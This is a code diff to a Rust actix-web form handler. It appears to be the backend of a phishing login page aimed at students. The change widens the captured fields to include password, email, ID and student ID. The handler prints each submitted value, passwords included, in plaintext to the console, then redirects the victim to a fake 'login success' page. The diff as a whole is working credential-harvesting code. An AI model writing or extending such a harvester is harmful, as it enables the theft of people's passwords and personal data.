@@ -4,10 +4,19 @@ use serde::Deserialize;
 
 #[derive(Debug, Deserialize)]
 struct InfoForm {
+    #[serde(default)]
     name: String,
-    phone: String,
-    student_id: String,
+    #[serde(default)]
+    phone: i64,
+    #[serde(default)]
     password: String,
+    #[serde(default)]
+    email: String,
+    #[serde(default)]
+    id: String,
+    #[serde(default)]
+    student_id: String,
+    #[serde(default)]
     agree: String,
 }
 
@@ -24,15 +33,21 @@ pub async fn submit(req: HttpRequest, form: web::Form<InfoForm>) -> HttpResponse
         println!("{}", "Warn: unable to get client addr".bright_red())
     }
     print!(
-        "\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n",
+        "\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n",
         "Name".bright_red().bold(),
         form.name,
         "Phone".bright_red().bold(),
         form.phone,
+        "Password".bright_red().bold(),
+        form.password,
+        "ID".bright_red().bold(),
+        form.id,
+        "Email".bright_red().bold(),
+        form.email,
         "Student ID".bright_red().bold(),
         form.student_id,
-        "Password".bright_red().bold(),
-        form.password
+        "Agree".red(),
+        form.agree,
     );
     HttpResponse::Found()
         .insert_header((header::LOCATION, "/login/success.html"))
